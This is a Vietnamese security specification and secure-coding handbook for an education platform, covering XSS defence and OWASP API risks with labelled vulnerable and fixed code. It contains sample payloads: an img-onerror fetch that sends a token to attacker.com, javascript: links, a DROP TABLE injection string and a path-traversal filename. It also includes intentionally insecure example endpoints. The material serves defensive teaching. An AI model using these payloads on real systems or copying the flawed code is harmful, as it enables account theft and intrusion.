# TÀI LIỆU ĐẶC TẢ & CẨM NANG LẬP TRÌNH BẢO MẬT WEB TOÀN DIỆN (XSS & OWASP TOP 10)
## DÀNH CHO NỀN TẢNG HỌC TẬP & KHẢO THÍ TIN HỌC GDPT (VUE 3 + FASTAPI + MYSQL)

Tài liệu này là tiêu chuẩn bảo mật bắt buộc cho toàn bộ thành viên phát triển dự án **TinHoc Education Platform**. Tài liệu bao gồm hai trụ cột chính:
1. **Phần I $\rightarrow$ IV:** Kiến trúc phòng chống chuyên sâu lỗ hổng **XSS (Cross-Site Scripting)** đặc thù cho nền tảng học và thi lập trình Tin học.
2. **Phần V $\rightarrow$ VI:** Cẩm nang lập trình bảo mật Web & API toàn diện theo chuẩn quốc tế **OWASP Top 10** và **OWASP API Security Top 10** (kèm mẫu code đối chiếu Thực hành Sai vs. Thực hành Chuẩn).

---

## I. TỔNG QUAN: BẢN CHẤT CỦA XSS VÀ NGHỊCH LÝ MÔN TIN HỌC

### 1. XSS (Cross-Site Scripting) là gì?
XSS là lỗ hổng bảo mật xảy ra khi ứng dụng web nhận dữ liệu không đáng tin cậy từ người dùng (như bài viết diễn đàn, câu hỏi, bình luận, tên hiển thị) và đưa thẳng dữ liệu đó ra trình duyệt của người dùng khác mà không qua kiểm tra, làm sạch (sanitizing) hoặc mã hóa thực thể (escaping).

Hậu quả khi hệ thống bị tấn công XSS:
* **Đánh cắp phiên đăng nhập (Session/Token Hijacking):** Kẻ tấn công đọc `localStorage` hoặc `document.cookie` (nếu không bật `HttpOnly`) để lấy cắp JWT Token và chiếm quyền điều khiển tài khoản của học sinh, giáo viên hoặc Admin.
* **Mạo danh hành động (Forced Actions):** Tự động gọi API nộp bài thi trắng, xóa câu hỏi, hoặc tự động duyệt tài liệu rác dưới quyền của nạn nhân.
* **Giao diện giả mạo (Phishing Defacement):** Chèn khung đăng nhập giả mạo ngay trên trang bài giảng để lừa học sinh nhập mật khẩu.

### 2. Nghịch lý XSS đặc thù của Nền tảng Tin học THPT
Khác với các ứng dụng thương mại điện tử thông thường, nền tảng Tin học đối mặt với bài toán hóc búa:
1. **Bắt buộc phải hiển thị mã nguồn hợp lệ:** Đề thi tốt nghiệp THPT, câu hỏi trắc nghiệm và bài thảo luận thường xuyên chứa các đoạn mã HTML/JS/SQL thực tế (ví dụ: *“Thẻ `<form action="/login" method="POST">` dùng để làm gì?”* hoặc bài thực hành JavaScript DOM).
2. **Nguy cơ xóa nhầm kiến thức (Over-sanitization):** Nếu dùng các bộ lọc regex thô sơ xóa sạch chữ `<script>` hay `<form>`, đoạn mã học tập của học sinh sẽ bị mất chữ và sai lệch kiến thức.
3. **Nguy cơ thực thi mã độc (Under-sanitization):** Nếu render trực tiếp nội dung bằng `v-html` trong Vue 3 mà không kiểm soát, kẻ tấn công sẽ chèn payload nguy hiểm núp bóng bài thảo luận code:
   ```html
   <!-- Payload tấn công núp bóng đề bài code -->
   <img src="x" onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))">
   <a href="javascript:alert(document.cookie)">Click xem lời giải</a>
   ```

---

## II. KIẾN TRÚC PHÒNG THỦ XSS 4 LỚP (DEFENSE-IN-DEPTH PIPELINE)

Hệ thống thiết lập $4$ lớp chốt chặn độc lập. Nếu một lớp bị vượt qua, các lớp còn lại vẫn bảo vệ an toàn cho người dùng:

```
[Dữ liệu người dùng gửi: Code / Markdown]
                     |
                     v
+--------------------------------------------------------------+
| LỚP 1: TẦNG SCHEMA & TÁCH RỜI DỮ LIỆU (Pydantic v2 Backend)   |
| - Tách biệt tuyệt đối giữa Văn bản mô tả và Khối Code nguồn  |
| - Khối code được đóng gói dạng JSON Object { language, code }|
+--------------------------------------------------------------+
                     |
                     v
+--------------------------------------------------------------+
| LỚP 2: TẦNG KHỬ KHUẨN MÁY CHỦ (Backend Sanitizer - nh3)      |
| - Làm sạch Markdown HTML với Strict Whitelist trước khi lưu  |
| - Triệt tiêu triệt để các scheme nguy hiểm (javascript:, data:)|
| - Lưu bản sạch vào CSDL MySQL                                |
+--------------------------------------------------------------+
                     |
                     v
+--------------------------------------------------------------+
| LỚP 3: TẦNG TRÌNH DUYỆT AN TOÀN (Frontend Vue 3 + DOMPurify) |
| - Tuyệt đối KHÔNG render Code Block bằng `v-html`             |
| - Nạp code vào <pre><code> qua `textContent` / Prism.js      |
| - Rich text bắt buộc chạy qua DOMPurify trước khi v-html     |
| - KaTeX toán học khóa chế độ an toàn: { trust: false }       |
+--------------------------------------------------------------+
                     |
                     v
+--------------------------------------------------------------+
| LỚP 4: CÔ LẬP TÀI NGUYÊN & TIÊU ĐỀ HTTP (Nginx / Cloudflare)  |
| - Content Security Policy (CSP): Khóa chặt nguồn chạy script |
| - Refresh Token lưu trữ dạng Cookie HttpOnly, Secure, Strict  |
| - X-Content-Type-Options: nosniff chống MIME-Confusion        |
+--------------------------------------------------------------+
```

---

## III. CHI TIẾT TRIỂN KHAI PHÒNG CHỐNG XSS TỪNG PHÂN TẦNG

### 1. Phân tầng CSDL & Data Contract: Nguyên tắc "Tách biệt Dữ liệu và Mã"
Tuyệt đối không lưu lẫn lộn mã code lập trình vào cùng một chuỗi văn bản HTML không có cấu trúc. Toàn bộ các bảng có mã nguồn (`questions`, `forum_posts`, `forum_answers`, `glossary_terms`) phải tách thành $2$ trường:
* **Trường văn bản mô tả (`content_markdown` / `markdown_body`):** Chứa lời giải thích, phân tích bằng văn bản.
* **Trường khối code chuyên biệt (`code_snippet` JSON):**
  ```json
  {
    "language": "html",
    "code": "<script>\n  console.log('Day la doan code mau minh hoa');\n</script>"
  }
  ```
*Khi khối code được lưu dưới dạng chuỗi JSON thuần (Plain String), nó hoàn toàn vô hại trong CSDL vì không được máy chủ hay trình duyệt diễn giải thành thẻ thực thi.*

### 2. Triển khai Backend: Bộ lọc Khử khuẩn Tự động (FastAPI + `nh3`)
Sử dụng thư viện **`nh3`** (binding Python của thư viện Rust Ammonia siêu nhanh, hiện đại, an toàn hơn Bleach vốn đã ngừng bảo trì).

#### A. File Service Khử khuẩn: `backend/app/core/sanitizer.py`
```python
import nh3

# 1. Danh sách các thẻ HTML an toàn được phép hiển thị trong bài học và diễn đàn
ALLOWED_TAGS = {
    "a", "abbr", "b", "blockquote", "br", "code", "div", "em", "h1", "h2", "h3",
    "h4", "h5", "h6", "hr", "i", "img", "kbd", "li", "ol", "p", "pre", "span",
    "strong", "sub", "sup", "table", "tbody", "td", "th", "thead", "tr", "ul"
}

# 2. Danh sách thuộc tính an toàn (loại bỏ hoàn toàn onclick, onerror, onload, style...)
ALLOWED_ATTRIBUTES = {
    "a": {"href", "title", "target", "rel"},
    "img": {"src", "alt", "title", "width", "height", "loading"},
    "code": {"class"},
    "span": {"class"},
    "div": {"class"},
    "th": {"align", "colspan", "rowspan"},
    "td": {"align", "colspan", "rowspan"},
}

# 3. Chỉ cho phép các giao thức mạng hợp lệ, chặn đứng "javascript:", "data:", "vbscript:"
ALLOWED_URL_SCHEMES = {"http", "https", "mailto"}

def clean_html_content(raw_html: str) -> str:
    """
    Khử khuẩn chuỗi HTML, loại bỏ toàn bộ thẻ <script>, iframe, thuộc tính sự kiện độc hại.
    """
    if not raw_html:
        return ""
        
    return nh3.clean(
        raw_html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        url_schemes=ALLOWED_URL_SCHEMES,
        link_rel="noopener noreferrer"  # Chống tấn công Tab-nabbing
    )

def clean_plain_text(raw_text: str) -> str:
    """
    Loại bỏ toàn bộ các thẻ HTML đối với tiêu đề hoặc tên người dùng.
    """
    if not raw_text:
        return ""
    return nh3.clean_text(raw_text.strip())
```

#### B. Thẩm định tự động tại Schema Pydantic v2: `backend/app/schemas/forum.py`
Mọi bài viết của học sinh được tự động làm sạch ngay khi đi qua cổng Pydantic trước khi chạm tới cơ sở dữ liệu:
```python
from pydantic import BaseModel, Field, field_validator, ConfigDict
from typing import Optional, Literal
from app.core.sanitizer import clean_html_content, clean_plain_text

class CodeSnippetSchema(BaseModel):
    model_config = ConfigDict(extra="forbid")
    language: Literal["python", "sql", "html", "css", "cpp", "javascript", "plaintext"] = "python"
    code: str = Field(..., max_length=20000)

class ForumPostCreateSchema(BaseModel):
    model_config = ConfigDict(extra="forbid")
    category_id: int
    title: str = Field(..., min_length=10, max_length=255)
    content_markdown: str = Field(..., min_length=20, max_length=50000)
    code_snippet: Optional[CodeSnippetSchema] = None

    @field_validator("title")
    @classmethod
    def sanitize_title(cls, v: str) -> str:
        # Tiêu đề không được chứa bất kỳ thẻ HTML nào
        return clean_plain_text(v)

    @field_validator("content_markdown")
    @classmethod
    def sanitize_content(cls, v: str) -> str:
        # Làm sạch nội dung văn bản trước khi lưu vào MySQL
        return clean_html_content(v)
```

### 3. Triển khai Frontend: Render An toàn (Vue 3 + DOMPurify + Prism.js)

#### A. Component hiển thị Mã nguồn An toàn: `src/components/code/CodeBlock.vue`
**Quy tắc bất biến:** Mã code **tuyệt đối không dùng `v-html`**. Nạp text thẳng qua cú pháp mustache `{{ code }}` (tương đương `textContent`) và để Prism.js tô màu cú pháp an toàn.
```html
<template>
  <div class="relative rounded-lg overflow-hidden my-4 border border-slate-700 bg-slate-900 shadow-md">
    <div class="flex justify-between items-center px-4 py-2 bg-slate-800 text-xs text-slate-300 font-mono">
      <span class="font-semibold uppercase text-indigo-400">{{ language }}</span>
      <button 
        type="button" 
        class="hover:text-white transition-colors cursor-pointer"
        @click="copyCode"
      >
        {{ copied ? 'Đã sao chép!' : 'Sao chép' }}
      </button>
    </div>
    <!-- Khối mã nguồn hiển thị an toàn: text được render thuần túy trong thẻ code -->
    <pre class="p-4 overflow-x-auto text-sm font-mono text-slate-100 leading-relaxed"><code ref="codeRef" :class="`language-${language}`">{{ code }}</code></pre>
  </div>
</template>

<script setup>
import { ref, onMounted, watch } from 'vue'
import Prism from 'prismjs'
import 'prismjs/themes/prism-tomorrow.css'
import 'prismjs/components/prism-python'
import 'prismjs/components/prism-sql'
import 'prismjs/components/prism-markup'

const props = defineProps({
  code: { type: String, required: true },
  language: { type: String, default: 'python' }
})

const codeRef = ref(null)
const copied = ref(false)

const highlight = () => {
  if (codeRef.value) {
    Prism.highlightElement(codeRef.value)
  }
}

onMounted(highlight)
watch(() => props.code, highlight)

const copyCode = async () => {
  await navigator.clipboard.writeText(props.code)
  copied.value = true
  setTimeout(() => { copied.value = false }, 2000)
}
</script>
```

#### B. Component hiển thị Markdown An toàn: `src/components/common/SafeMarkdownViewer.vue`
Sử dụng `DOMPurify` để khử trùng phía Client trước khi đưa vào `v-html`:
```html
<template>
  <div class="prose prose-slate max-w-none dark:prose-invert" v-html="sanitizedHtml"></div>
</template>

<script setup>
import { computed } from 'vue'
import { marked } from 'marked'
import DOMPurify from 'dompurify'

const props = defineProps({
  content: { type: String, default: '' }
})

const sanitizedHtml = computed(() => {
  const rawCompiled = marked.parse(props.content || '')
  return DOMPurify.sanitize(rawCompiled, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'b', 'i', 'strong', 'em',
      'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'blockquote', 'a', 'img', 'hr', 'br', 'span', 'code', 'pre'
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form', 'input'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style']
  })
})
</script>
```

### 4. Phòng thủ KaTeX (Công thức Toán / Biểu thức Logic)
Biểu thức KaTeX có thể bị lợi dụng qua lệnh `\url{javascript:...}` hoặc `\href` nếu cấu hình sai:
```javascript
const katexSafeOptions = {
  throwOnError: false,
  trust: false,       // BẮT BUỘC FALSE: Cấm chèn lệnh \url{} hoặc macro nhúng script
  strict: "warn",
  maxExpand: 100      // Chống tấn công DoS làm treo trình duyệt bằng công thức đệ quy vô hạn (Billion Laughs)
}
```

### 5. Cấu hình Hạ tầng & HTTP Headers (Lá chắn Cuối cùng)
* **Refresh Token lưu trong Cookie `HttpOnly`:**
  ```python
  response.set_cookie(
      key="refresh_token",
      value=refresh_token,
      httponly=True,     # JavaScript hoàn toàn KHÔNG THỂ đọc được
      secure=True,       # Chỉ gửi qua kết nối HTTPS
      samesite="Strict", # Chống tấn công CSRF
      path="/api/v1/auth/refresh-token", # Chỉ gửi cookie này khi gọi đúng đường dẫn refresh!
      max_age=7 * 24 * 3600
  )
  ```
* **Thiết lập Security Headers trên Nginx (`/etc/nginx/conf.d/default.conf`):**
  ```nginx
  add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://cdn.tinhoc.edu.vn; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  ```

---

## IV. BẢNG ĐỐI CHIẾU VECTOR TẤN CÔNG XSS & KẾT QUẢ VÔ HIỆU HÓA

| Vector Tấn công XSS Thường Gặp | Mục Đích Tấn Công | Cơ Chế Hệ Thống Đã Triệt Tiêu |
| :--- | :--- | :--- |
| `<script>alert(localStorage.getItem('token'))</script>` | Thực thi script đánh cắp Token | **Lớp 2 (`nh3`)** bóc sạch thẻ `<script>`. Nếu nằm trong khối code, **Lớp 3 (`CodeBlock`)** nạp qua `textContent` nên chỉ hiển thị chữ chứ không chạy. |
| `<img src="x" onerror="stealData()">` | Kích hoạt script qua sự kiện lỗi ảnh | **Lớp 2 (`nh3`)** và **Lớp 3 (`DOMPurify`)** gỡ bỏ triệt để thuộc tính `onerror`. |
| `<a href="javascript:alert(1)">Xem giải</a>` | Lừa người dùng click để chạy mã | **`nh3`** chặn mọi URL Scheme không thuộc `http`, `https`, `mailto`. |
| `$$\url{javascript:alert(1)}$$` | Tấn công qua macro của KaTeX | KaTeX cấu hình `{ trust: false, maxExpand: 100 }` cấm lệnh `\url` và chống đệ quy. |
| Đánh cắp Refresh Token qua Console | Lấy cắp token dài hạn để duy trì phiên | Token lưu trong **Cookie `HttpOnly`** và giới hạn `path`, mã JavaScript hoàn toàn không truy cập được. |

---

## V. CẨM NANG LẬP TRÌNH BẢO MẬT WEB & API TOÀN DIỆN (CHUẨN OWASP TOP 10 & API SECURITY)

Theo báo cáo bảo mật ứng dụng Web của **OWASP Top 10** và **OWASP API Security Top 10**, hơn $80\%$ các cuộc tấn công thực tế nhắm vào tầng logic API từ những người dùng đã đăng nhập hợp lệ. Dưới đây là **8 Nguyên tắc Lập trình Bảo mật Bắt buộc** khi viết code cho dự án:

---

### 1. Chống Lỗ hổng Kiểm soát Truy cập – BOLA / IDOR & BFLA (OWASP Top 1)
* **Bản chất:** **BOLA (Broken Object Level Authorization)** hay **IDOR (Insecure Direct Object Reference)** xảy ra khi API nhận một `id` từ URL (ví dụ `/api/v1/exams/submissions/{id}`) và chỉ kiểm tra xem người dùng đã đăng nhập chưa, mà **quên kiểm tra xem bản ghi `{id}` đó có thực sự thuộc về người dùng đang gọi hay không**. Học sinh A chỉ cần đổi `{id}` trên URL là xem hoặc nộp hộ được bài thi của Học sinh B!
* **Quy tắc vàng:** Mọi truy vấn đọc/sửa/xóa dữ liệu cá nhân **bắt buộc phải kẹp điều kiện `user_id == current_user.id`** ngay trong câu lệnh SQL (Row-Level Security).

```python
# ❌ CODE LỖI BẢO MẬT NGHIÊM TRỌNG (Dính lỗ hổng BOLA / IDOR):
@router.get("/submissions/{submission_id}")
async def get_submission(
    submission_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_active_user)
):
    # Chỉ tìm theo submission_id -> Học sinh A truyền ID bài thi của Học sinh B vào là xem được hết!
    stmt = select(ExamSubmission).where(ExamSubmission.id == submission_id)
    result = await db.execute(stmt)
    return result.scalar_one_or_none()


# ✅ CODE CHUẨN AN TOÀN (Kiểm tra quyền sở hữu cấp độ dòng - Row-Level Security):
@router.get("/submissions/{submission_id}")
async def get_submission(
    submission_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_active_user)
):
    stmt = select(ExamSubmission).where(ExamSubmission.id == submission_id)
    
    # Nếu không phải Admin hoặc Giáo viên, bắt buộc chỉ được xem bài của chính mình
    if not current_user.has_any_role(["Admin", "Instructor"]):
        stmt = stmt.where(ExamSubmission.user_id == current_user.id)
        
    result = await db.execute(stmt)
    submission = result.scalar_one_or_none()
    if not submission:
        # Trả về 404 thay vì 403 để kẻ tấn công không dò được ID nào đang tồn tại
        raise HTTPException(status_code=404, detail="Không tìm thấy bài thi.")
    return submission
```

---

### 2. Chống Lộ Dữ liệu Nhạy cảm & Gán Hàng loạt – BOPLA / Mass Assignment (OWASP API3)
Lỗ hổng **BOPLA (Broken Object Property Level Authorization)** gồm 2 chiều:
1. **Chiều gửi lên (Mass Assignment):** Người dùng gửi API cập nhật hồ sơ cá nhân `PUT /users/me` nhưng cố tình chèn thêm `"reputation_score": 99999, "contributor_points": 50000, "status": "Active"` vào JSON body. Nếu Backend dùng vòng lặp gán thẳng mọi trường từ request vào Model, kẻ tấn công sẽ tự nâng điểm cho mình!
2. **Chiều trả về (Excessive Data Exposure):** API trả về thẳng đối tượng SQLAlchemy Model mà không lọc qua Pydantic Response Schema, vô tình làm lộ `password_hash`, `solution_payload` (đáp án đúng của câu hỏi), hoặc `grading_snapshot` khi học sinh đang làm bài thi!

```python
# ❌ CODE LỖI (Vừa dính Mass Assignment vừa lộ mật khẩu/đáp án):
@router.put("/users/me")
async def update_profile(payload: dict, db: AsyncSession = Depends(get_db), current_user: User = Depends(get_current_user)):
    for key, value in payload.items():
        setattr(current_user, key, value) # Hacker gửi {"contributor_points": 99999} là được cộng điểm!
    await db.commit()
    return current_user # Trả về nguyên cục User model chứa cả password_hash!


# ✅ CODE CHUẨN AN TOÀN (Khóa chặt Schema đầu vào & đầu ra bằng Pydantic v2):
class UserProfileUpdateSchema(BaseModel):
    model_config = ConfigDict(extra="forbid") # Gửi thêm trường lạ sẽ bị chặn ngay với lỗi 422!
    full_name: str = Field(..., min_length=2, max_length=100)
    phone_number: Optional[str] = Field(None, pattern=r"^0\d{9}$")
    track_preference: Literal["ICT", "CS"]

class UserPublicResponseSchema(BaseModel):
    id: str
    email: str
    full_name: str
    track_preference: Optional[str]
    reputation_score: int
    contributor_points: int
    # Tuyệt đối không khai báo password_hash hay failed_login_attempts ở đây!

@router.put("/users/me", response_model=UserPublicResponseSchema)
async def update_profile(
    payload: UserProfileUpdateSchema,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_active_user)
):
    current_user.full_name = clean_plain_text(payload.full_name)
    current_user.phone_number = payload.phone_number
    current_user.track_preference = payload.track_preference
    await db.commit()
    await db.refresh(current_user)
    return current_user
```

> ⚠️ **CẢNH BÁO ĐẶC BIỆT CHO PHÂN HỆ THI CỬ (`MOD-EXAM-04` & `MOD-QBANK-03`):**
> Khi học sinh đang làm bài (`status == 'InProgress'`), API lấy câu hỏi hoặc lấy đề thi **TUYỆT ĐỐI KHÔNG ĐƯỢC** `SELECT` hoặc trả về cột `solution_payload` (bảng `questions`) và `grading_snapshot` (bảng `exam_submissions`). Hai cột này chỉ được đọc ở phía Server trong hàm chấm điểm sau khi đã khóa bài nộp!

---

### 3. Phòng chống Tiêm nhiễm SQL (SQL Injection) ngay cả khi dùng ORM
Nhiều bạn nghĩ dùng SQLAlchemy ORM là an toàn $100\%$ trước SQL Injection. Điều đó đúng khi bạn dùng các phương thức chuẩn như `.where(Question.grade_id == grade_id)`, nhưng sẽ **dính lỗ hổng SQL Injection chí mạng** nếu bạn dùng `text(f"...")` hoặc cho phép người dùng truyền tên cột sắp xếp (`sort_by`) trực tiếp vào câu truy vấn!

```python
# ❌ CODE LỖI (Dính SQL Injection qua tham số sort_by hoặc f-string):
@router.get("/questions")
async def list_questions(sort_by: str = "created_at", db: AsyncSession = Depends(get_db)):
    # Kẻ tấn công truyền sort_by = "created_at; DROP TABLE questions;--"
    stmt = select(Question).order_by(text(f"{sort_by} DESC"))
    return (await db.execute(stmt)).scalars().all()


# ✅ CODE CHUẨN AN TOÀN (Dùng từ điển Whitelist ánh xạ cột của SQLAlchemy):
ALLOWED_SORT_COLUMNS = {
    "created_at": Question.created_at,
    "usage_count": Question.usage_count,
    "difficulty": Question.difficulty_level,
}

@router.get("/questions")
async def list_questions(
    sort_by: Literal["created_at", "usage_count", "difficulty"] = "created_at",
    db: AsyncSession = Depends(get_db)
):
    sort_column = ALLOWED_SORT_COLUMNS.get(sort_by, Question.created_at)
    stmt = select(Question).where(Question.status == "Approved").order_by(sort_column.desc())
    return (await db.execute(stmt)).scalars().all()
```

---

### 4. Bảo mật Xác thực, Mã OTP & Chống Tấn công Thời gian (Authentication & Timing Attacks)
Khi lập trình Module 1 (`MOD-AUTH-01`), bắt buộc tuân thủ $4$ nguyên tắc mật mã học sau:
1. **Không dùng `==` để so sánh chuỗi nhạy cảm (OTP Hash, Reset Token, Signature):** Phép so sánh `a == b` thông thường trả về `False` ngay ở ký tự đầu tiên bị lệch, tạo điều kiện cho kẻ tấn công đo thời gian phản hồi (Timing Attack) để đoán từng ký tự. Bắt buộc dùng **`hmac.compare_digest(a, b)`** hoặc **`secrets.compare_digest(a, b)`**.
2. **Bảo vệ mã OTP 6 chữ số bằng HMAC-SHA256 + Server Pepper:**
   Vì mã OTP 6 số chỉ có $1,000,000$ khả năng ($000000 \rightarrow 999999$), nếu chỉ băm bằng `SHA-256` thuần túy, kẻ tấn công chỉ mất $0.01\text{ giây}$ để dò ngược ra toàn bộ bảng băm. Bắt buộc phải băm kèm khóa bí mật của Server (`SECRET_KEY`):
   ```python
   import hmac
   import hashlib
   import secrets
   from app.core.config import settings

   def generate_otp_code() -> str:
       # Tuyệt đối KHÔNG dùng random.randint() vì có thể đoán trước chuỗi giả ngẫu nhiên!
       # Bắt buộc dùng thư viện mật mã học secrets:
       return f"{secrets.randbelow(1000000):06d}"

   def hash_otp_code(otp_code: str, user_id: str) -> str:
       # Kết hợp user_id + otp_code và ký bằng SECRET_KEY của máy chủ
       message = f"{user_id}:{otp_code}".encode("utf-8")
       secret_pepper = settings.SECRET_KEY.encode("utf-8")
       return hmac.new(secret_pepper, message, hashlib.sha256).hexdigest()

   def verify_otp_code(input_otp: str, user_id: str, stored_hash: str) -> bool:
       computed_hash = hash_otp_code(input_otp, user_id)
       # So sánh thời gian hằng số (Constant-time comparison) chống Timing Attack
       return hmac.compare_digest(computed_hash, stored_hash)
   ```
3. **Chống Dò quét Tài khoản (Anti-Account Enumeration):**
   * Tại API Đăng nhập (`/auth/login`): Dù sai Email hay sai Mật khẩu, luôn trả về đúng một câu thông báo giống hệt nhau: `"Email hoặc mật khẩu không chính xác"`.
   * Tại API Quên mật khẩu (`/auth/forgot-password`): Dù Email có tồn tại trong hệ thống hay không, luôn trả về `HTTP 200 OK` kèm thông báo: `"Nếu địa chỉ email tồn tại trong hệ thống, mã khôi phục đã được gửi đi"`.

---

### 5. Chống Xung đột Đồng thời & Gian lận Nộp Kép (Race Condition & Double-Spend Prevention)
* **Kịch bản tấn công thực tế:**
  1. Học sinh dùng công cụ gửi đồng thời $10$ request `POST /exams/submissions/{id}/submit` trong cùng $1\text{ mili-giây}$ để đánh lừa hệ thống chấm điểm nhiều lần hoặc ghi nhận sai lệch.
  2. Hai kiểm duyệt viên cùng bấm nút `"Phê duyệt tài liệu"` ở cùng một thời điểm, khiến tác giả được cộng $+200 \times 2 = +400\text{ điểm cống hiến}$.
* **Giải pháp bắt buộc:** Sử dụng **Khóa bản ghi mức CSDL (`SELECT ... FOR UPDATE` / Row-Level Locking)** bên trong một Transaction kết hợp với `idempotency_key`.

```python
# ✅ CODE CHUẨN AN TOÀN (Chống Race Condition khi nộp bài thi hoặc duyệt tài liệu):
@router.post("/submissions/{submission_id}/submit")
async def submit_exam(
    submission_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_active_user)
):
    async with db.begin(): # Mở Transaction nguyên tử (ACID)
        # Dùng .with_for_update() để khóa dòng bài thi này lại cho đến khi chấm xong!
        # Nếu có request thứ 2 gửi lên cùng lúc, nó phải xếp hàng chờ và sẽ thấy status đã là 'Submitted'
        stmt = (
            select(ExamSubmission)
            .where(
                ExamSubmission.id == submission_id,
                ExamSubmission.user_id == current_user.id
            )
            .with_for_update()
        )
        submission = (await db.execute(stmt)).scalar_one_or_none()
        
        if not submission:
            raise HTTPException(status_code=404, detail="Không tìm thấy phiên thi.")
        if submission.status != "InProgress":
            raise HTTPException(status_code=409, detail="Bài thi này đã được nộp trước đó!")
            
        # Cập nhật trạng thái ngay lập tức và tiến hành chấm điểm...
        submission.status = "Submitted"
        submission.submitted_at = func.now()
        # ... (xử lý lưu đáp án và tính điểm)
```

---

### 6. Bảo mật Tải Tệp lên, Chống Path Traversal & Zip Bomb (`MOD-SHARE-07`)
Khi xử lý tệp người dùng tải lên (`.pdf`, `.docx`, `.pptx`, `.xlsx`, `.zip`), kẻ tấn công có thể:
* Đổi tên file mã độc `shell.py` hoặc `virus.exe` thành `de_thi.pdf`.
* Đặt tên file là `../../../../etc/cron.d/backdoor` (Lỗ hổng **Path Traversal**) để ghi đè file hệ thống máy chủ.
* Tải lên file `.zip` nặng $1\text{ MB}$ nhưng khi giải nén phình ra $10\text{ GB}$ làm sập ổ cứng (**Zip Bomb**).

**Quy trình 5 bước kiểm tra tệp tải lên bắt buộc tại Backend:**
```python
import os
import uuid
import hashlib
import puremagic
from pathlib import Path
from fastapi import UploadFile, HTTPException

UPLOAD_DIR = Path("/app/storage/contributions").resolve()
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB

ALLOWED_MIME_TYPES = {
    ".pdf": {"application/pdf"},
    ".docx": {"application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip"},
    ".pptx": {"application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/zip"},
    ".xlsx": {"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/zip"},
    ".zip": {"application/zip", "application/x-zip-compressed"}
}

async def validate_and_save_upload(file: UploadFile) -> dict:
    # 1. Lấy phần mở rộng an toàn, chống Path Traversal từ filename gốc
    original_name = os.path.basename(file.filename or "document.pdf")
    ext = Path(original_name).suffix.lower()
    if ext not in ALLOWED_MIME_TYPES:
        raise HTTPException(status_code=400, detail=f"Định dạng tệp {ext} không được hỗ trợ.")

    # 2. Đọc file theo từng chunk để kiểm soát dung lượng (chống tràn RAM khi gặp file 10GB)
    sha256_hash = hashlib.sha256()
    total_bytes = 0
    header_bytes = b""
    
    safe_filename = f"{uuid.uuid4()}{ext}"
    destination_path = (UPLOAD_DIR / safe_filename).resolve()
    
    # Chốt chặn Path Traversal: Đảm bảo đường dẫn đích nằm gọn trong UPLOAD_DIR
    if not str(destination_path).startswith(str(UPLOAD_DIR)):
        raise HTTPException(status_code=400, detail="Đường dẫn lưu trữ không hợp lệ.")

    with open(destination_path, "wb") as buffer:
        while chunk := await file.read(1024 * 1024):  # Đọc từng 1MB
            total_bytes += len(chunk)
            if total_bytes > MAX_FILE_SIZE:
                buffer.close()
                destination_path.unlink(missing_ok=True)
                raise HTTPException(status_code=413, detail="Dung lượng tệp vượt quá giới hạn 50MB.")
            if len(header_bytes) < 2048:
                header_bytes += chunk[:2048 - len(header_bytes)]
            sha256_hash.update(chunk)
            buffer.write(chunk)

    # 3. Kiểm tra chữ ký byte thực tế (Magic Bytes) bằng puremagic
    try:
        detected_mimes = {m.mime_type for m in puremagic.magic_string(header_bytes)}
    except Exception:
        destination_path.unlink(missing_ok=True)
        raise HTTPException(status_code=400, detail="Không thể xác thực định dạng tệp tin.")

    if not (detected_mimes & ALLOWED_MIME_TYPES[ext]):
        destination_path.unlink(missing_ok=True)
        raise HTTPException(status_code=400, detail="Nội dung tệp không khớp với phần mở rộng (nghi vấn giả mạo tệp).")

    return {
        "original_file_name": original_name,
        "storage_path": str(destination_path),
        "file_extension": ext,
        "file_size_bytes": total_bytes,
        "file_hash_sha256": sha256_hash.hexdigest()
    }
```

---

### 7. Phòng chống Cấu hình Sai Hạ tầng & Rò rỉ Mã nguồn (Security Misconfiguration - OWASP #2)
Các lỗi cấu hình nhỏ nhưng gây hậu quả nghiêm trọng nhất trên môi trường thực tế (Production):

1. **Tuyệt đối không mở cổng MySQL và Redis ra ngoài Internet công cộng trên Docker:**
   * Trên máy chủ Linux (Ubuntu/Debian), khi bạn cấu hình `ports: - "3306:3306"` trong `docker-compose.yml`, Docker sẽ tự động sửa `iptables` và **đi xuyên qua tường lửa UFW**, làm lộ thẳng cổng Database MySQL ra toàn cầu cho botnet quét mật khẩu!
   * **Cách khắc phục:** Chỉ bind vào `127.0.0.1` trên máy chủ hoặc đóng hoàn toàn `ports` của DB trên bản Production:
     ```yaml
     # Trong docker-compose.yml:
     ports:
       - "127.0.0.1:3307:3306" # Chỉ cho phép kết nối từ bên trong máy chủ, chặn đứng truy cập từ Internet ngoài!
     ```
2. **Tắt tài liệu Swagger (`/docs`, `/redoc`) và Stack Trace trên Production:**
   ```python
   # Trong backend/main.py:
   app = FastAPI(
       title=settings.PROJECT_NAME,
       # Tự động ẩn Swagger UI và ReDoc khi DEBUG=False (Production)
       docs_url="/docs" if settings.DEBUG else None,
       redoc_url="/redoc" if settings.DEBUG else None,
       openapi_url="/openapi.json" if settings.DEBUG else None,
   )
